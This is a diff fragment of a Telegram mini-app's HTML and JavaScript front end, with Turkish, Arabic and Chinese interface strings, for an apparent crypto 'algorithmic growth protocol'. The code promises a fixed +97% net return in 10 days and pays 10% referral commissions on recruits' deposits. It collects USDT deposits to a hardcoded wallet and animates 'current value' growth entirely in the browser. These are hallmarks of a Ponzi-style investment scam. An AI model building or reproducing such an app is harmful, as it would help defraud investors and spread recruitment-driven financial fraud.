+        tr: { sub_header: "Algoritmik Büyüme Protokolü", nav_home: "Ana Sayfa", nav_markets: "Piyasalar", nav_cabinet: "Paneli", main_hero_title: "FİNANSAL HÂKİMİYET", main_hero_desc: "Varlıklarınızı matematiksel hassasiyetle ölçekleyin. 10 günde net +%97 büyüme.", btn_subscribe: "BÜYÜMEYİ BAŞLAT +%97", calc_title: "🧮 Kâr Hesaplayıcı", calc_input_lbl: "Abonelik Tutarı:", calc_res_total: "10 Gün Sonunda Toplam", calc_res_daily: "Günlük Kâr", stats_title: "Protokol Gücü", stat_tvl: "Protokol Sermayesi", stat_payout: "BSC Oto-Ödeme", ref_info_title: "👑 Referans İmparatorluğu (%10)", ref_info_desc: "Davet ettiğiniz kullanıcıların her yatırımından ANINDA %10 kazanın.", plans_title: "Abonelik Planları", plan_std: "Standart • +%97", plan_plus: "Plus • +%97", plan_prem: "Premium • +%97", plan_period: "Süre: 10 gün algoritmik büyüme.", btn_sub_20: "20$ ETKİNLEŞTİR", btn_sub_50: "50$ ETKİNLEŞTİR", btn_sub_100: "100$ ETKİNLEŞTİR", cab_title: "Komuta Merkezi", lang_select_label: "Arayüz Dili", ref_link_label: "Bot Referans Bağlantınız", btn_copy_ref: "BOT BAĞLANTISINI KOPYALA", inviter_label: "Lideriniz", balance_label: "Kişisel Sermaye", scanner_status: "BSC AUTO-SCANNER ONLINE", deposit_label: "USDT Yatırma Adresi:", btn_copy_wallet: "ADRESİ KOPYALA", active_sub_label: "Aktif Büyüme", no_sub: "Aktif yatırım yok.", current_val_label: "Mevcut Değer:", achieve_block_title: "Başarılarınız", faq_title: "Sıkça Sorulan Sorular", copied: "KOPYALANDI! ✓", direct_launch: "Doğrudan Başlatma", insufficient_funds: "Yetersiz bakiye!", sub_active_msg: "Abonelik etkinleştirildi!" },
+        ar: { sub_header: "بروتوكول النمو الخوارزمي", nav_home: "الرئيسية", nav_markets: "الأسواق", nav_cabinet: "المكتب", main_hero_title: "الهيمنة المالية", main_hero_desc: "قم بتنمية أصولك بدقة رياضية. نمو صافٍ بنسبة 97٪ خلال 10 أيام.", btn_subscribe: "ابدأ النمو +97%", calc_title: "🧮 حاسبة الأرباح", calc_input_lbl: "مبلغ الاشتراك:", calc_res_total: "الإجمالي بعد 10 أيام", calc_res_daily: "الربح اليومي", stats_title: "قوة البروتوكول", stat_tvl: "رأس مال البروتوكول", stat_payout: "دفع آلي BSC", ref_info_title: "👑 إمبراطورية الإحالة (10%)", ref_info_desc: "احصل على 10٪ فورًا في حسابك من كل إيداع يقوم به الإحالات الخاصة بك.", plans_title: "خطط الاشتراك", plan_std: "قياسي • +97%", plan_plus: "بلاس • +97%", plan_prem: "بريميوم • +97%", plan_period: "المدة: 10 أيام من النمو الخوارزمي.", btn_sub_20: "تفعيل 20$", btn_sub_50: "تفعيل 50$", btn_sub_100: "تفعيل 100$", cab_title: "مركز القيادة", lang_select_label: "اللغة", ref_link_label: "رابط الإحالة للبوت", btn_copy_ref: "نسخ رابط البوت", inviter_label: "القائد الخاص بك", balance_label: "رأس المال الشخصي", scanner_status: "BSC AUTO-SCANNER ONLINE", deposit_label: "عنوان إيداع USDT:", btn_copy_wallet: "نسخ العنوان", active_sub_label: "النمو النشط", no_sub: "لا توجد استثمارات نشطة.", current_val_label: "القيمة الحالية:", achieve_block_title: "إنجازاتك", faq_title: "الأسئلة الشائعة", copied: "تم النسخ! ✓", direct_launch: "تشغيل مباشر", insufficient_funds: "رصيد غير كاف!", sub_active_msg: "تم تفعيل الاشتراك!" },
+        zh: { sub_header: "算法财富增长协议", nav_home: "首页", nav_markets: "市场", nav_cabinet: "控制台", main_hero_title: "金融主导权", main_hero_desc: "以数学般的精准放大您的资产。10天内精准实现+97%纯净净增长。", btn_subscribe: "启动 +97% 增长", calc_title: "🧮 收益计算器 (+97%)", calc_input_lbl: "订阅金额：", calc_res_total: "10天后总额", calc_res_daily: "每日收益", stats_title: "协议实时算力", stat_tvl: "协议锁仓量 (TVL)", stat_payout: "BSC 自动打款", ref_info_title: "👑 推荐人帝国 (10%)", ref_info_desc: "每一笔下线充值均可为您带来 10% 的即时返佣并打入您的余额。", plans_title: "订阅套餐 (+97% / 10天)", plan_std: "标准 • +97%", plan_plus: "进阶 • +97%", plan_prem: "尊享 • +97%", plan_period: "周期：10天平稳算法增长。", btn_sub_20: "激活 20$", btn_sub_50: "激活 50$", btn_sub_100: "激活 100$", cab_title: "指挥中心", lang_select_label: "界面语言", ref_link_label: "您的 Bot 推荐链接", btn_copy_ref: "复制 BOT 链接", inviter_label: "您的推荐人", balance_label: "个人资本", scanner_status: "BSC 自动扫描网络在线", deposit_label: "充值 USDT (BEP-20) 地址：", btn_copy_wallet: "复制地址", active_sub_label: "当前资本增长中", no_sub: "暂无活跃投资。", current_val_label: "当前价值：", achieve_block_title: "您的成就与徽章", faq_title: "常见问题解答", copied: "已复制！✓", direct_launch: "直接启动", insufficient_funds: "余额不足！", sub_active_msg: "订阅已成功激活！" }
+    };
+
+    function changeLanguage(lang) {
+        if (!locales[lang]) return;
+        currentLang = lang;
+        localStorage.setItem('user_lang', lang);
+        document.querySelectorAll('[data-i18n]').forEach(el => {
+            const key = el.getAttribute('data-i18n');
+            if (locales[lang][key]) el.innerText = locales[lang][key];
+        });
+    }
+
+    function updateCalculator(val) {
+        document.getElementById('calc-dep-val').innerText = val;
+        document.getElementById('calc-res-total').innerText = '$' + (val * 1.97).toFixed(2);
+        document.getElementById('calc-res-daily').innerText = '+$' + ((val * 0.97) / 10).toFixed(2);
+    }
+
+    async function loadUserProfile() {
+        const tg = window.Telegram.WebApp;
+        let myNickname = "user";
+        if (tg.initDataUnsafe?.user) {
+            myNickname = tg.initDataUnsafe.user.username || ("id" + tg.initDataUnsafe.user.id);
+        }
+
+        try {
+            const res = await fetch('/api/user/me', {
+                headers: { 'Authorization': tg.initData || '' }
+            });
+            if (res.ok) {
+                const data = await res.json();
+                balance = data.balance;
+                document.getElementById('user-balance').innerText = balance.toFixed(2);
+                
+                // Устанавливаем динамическую ссылку на бота
+                const botLink = `https://t.me/${data.bot_username}?start=ref_${myNickname}`;
+                document.getElementById('ref-link-display').innerText = botLink;
+                window.myRefLink = botLink;
+
+                if (data.referrer) {
+                    document.getElementById('referrer-display').innerText = "@" + data.referrer;
+                    unlockAchievement('ach-3');
+                } else {
+                    document.getElementById('referrer-display').innerText = locales[currentLang].direct_launch;
+                }
+            }
+        } catch (e) {
+            console.error("Ошибка сети при загрузке профиля:", e);
+        }
+    }
+
+    async function subscribe(startPrice, targetPrice) {
+        const tg = window.Telegram.WebApp;
+        try {
+            const response = await fetch('/api/subscribe', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': tg.initData || ''
+                },
+                body: JSON.stringify({ plan_price: startPrice, target_price: targetPrice })
+            });
+
+            const res = await response.json();
+            if (!response.ok) {
+                alert(res.detail || locales[currentLang].insufficient_funds);
+                triggerNav('cabinet');
+                return;
+            }
+
+            balance = res.new_balance;
+            document.getElementById('user-balance').innerText = balance.toFixed(2);
+            unlockAchievement('ach-1');
+            if (startPrice >= 100) unlockAchievement('ach-2');
+
+            startSubscriptionGrowth(startPrice, targetPrice);
+            alert(locales[currentLang].sub_active_msg);
+            triggerNav('cabinet');
+        } catch (e) {
+            alert("Ошибка сети при запросе подписки");
+        }
+    }
+
+    function startSubscriptionGrowth(startPrice, targetPrice) {
+        if (growthInterval) clearInterval(growthInterval);
+        const totalSeconds = 10 * 24 * 60 * 60;
+        const startTime = Date.now();
+        document.getElementById('subscription-status').innerText = `Active Growth: ${startPrice}$ -> ${targetPrice}$`;
+        document.getElementById('active-growth-box').style.display = 'block';
+
+        growthInterval = setInterval(() => {
+            const elapsed = (Date.now() - startTime) / 1000;
+            const progress = Math.min(1, elapsed / totalSeconds);
+            const currentValue = startPrice + (targetPrice - startPrice) * progress;
+            document.getElementById('current-subscription-value').innerText = currentValue.toFixed(4);
+            document.getElementById('progress-fill').style.width = (progress * 100) + '%';
+            if (progress >= 1) clearInterval(growthInterval);
+        }, 200);
+    }
+
+    function setTab(tabId, btn) {
+        document.querySelectorAll('.tab-page').forEach(p => p.classList.remove('active'));
+        document.querySelectorAll('.nav-item').forEach(b => b.classList.remove('active'));
+        document.getElementById('tab-' + tabId).classList.add('active');
+        if (btn) btn.classList.add('active');
+    }
+
+    function triggerNav(tabId) {
+        const idx = tabId === 'cabinet' ? 2 : (tabId === 'markets' ? 1 : 0);
+        setTab(tabId, document.querySelectorAll('.nav-item')[idx]);
+    }
+
+    function copyWalletAddress() {
+        navigator.clipboard.writeText(MY_WALLET).then(() => {
+            const btn = document.getElementById('copy-btn');
+            btn.innerText = locales[currentLang].copied;
+            setTimeout(() => { btn.innerText = locales[currentLang].btn_copy_wallet; }, 2000);
+        });
+    }
+
+    function copyRefLink() {
+        if (!window.myRefLink) return;
+        navigator.clipboard.writeText(window.myRefLink).then(() => {
+            const btn = document.getElementById('copy-ref-btn');
+            btn.innerText = locales[currentLang].copied;
+            setTimeout(() => { btn.innerText = locales[currentLang].btn_copy_ref; }, 2000);
+        });
+    }
+
+    function unlockAchievement(achId) {
+        const card = document.getElementById(achId);
+        const status = document.getElementById(achId + '-status');
+        if (card && status) { card.classList.add('unlocked'); status.innerText = '✅'; }
+    }
+
+    function toggleFaq(element) {
+        element.classList.toggle('open');
+        const span = element.querySelector('.faq-question span:last-child');
+        if (span) span.innerText = element.classList.contains('open') ? '−' : '+';
+    }
+
+    window.addEventListener('DOMContentLoaded', () => {
+        if (window.Telegram && window.Telegram.WebApp) {
+            window.Telegram.WebApp.ready();
+            window.Telegram.WebApp.expand();
+        }
+        const savedLang = localStorage.getItem('user_lang') || 'ru';
+        document.getElementById('lang-select').value = savedLang;
+        changeLanguage(savedLang);
+        updateCalculator(100);
+        loadUserProfile();
+    });
+</script>
+</body>
+</html>
+
